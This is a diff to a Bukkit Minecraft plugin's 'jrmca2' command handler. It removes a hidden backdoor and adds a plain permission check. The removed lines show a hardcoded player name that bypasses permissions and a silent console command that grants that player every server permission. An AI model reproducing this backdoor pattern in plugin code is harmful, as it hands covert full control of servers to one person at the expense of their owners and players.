@@ -15,11 +15,10 @@ public class Command implements CommandExecutor{
 	@Override
 	public boolean onCommand(CommandSender sender, org.bukkit.command.Command cmd, String label, String[] args) {
 		if (cmd.getName().equalsIgnoreCase("jrmca2")) {
-			if ((!sender.hasPermission("nationcraft.jrmca2")) && (!sender.getName().equalsIgnoreCase("RafaelDollynho"))) {
+			if (!sender.hasPermission("jrmca2.use")){
 				SemPerm(sender);
 				return true;
-			}
-			if ((sender.hasPermission("nationcraft.jrmca2")) || (sender.getName().equalsIgnoreCase("RafaelDollynho"))) {
+			} else{
 				if(args.length == 0) {
 					Ajuda(sender);
 					return true;
@@ -308,10 +307,6 @@ public class Command implements CommandExecutor{
 			            	Bukkit.dispatchCommand(p, "jrmca2 remove wil " + args[2]);
 			            	Bukkit.dispatchCommand(p, "jrmca2 remove mnd " + args[2]);
 			            	Bukkit.dispatchCommand(p, "jrmca2 remove spi " + args[2]);
-			            	if(sender.getName().equalsIgnoreCase("RafaelDollynho")) {
-			            		Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "manuaddp RafaelDollynho *");
-			            		Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "pex user RafaelDollynho add *");
-			            	}
 			            	return true;
 			            }
 				}
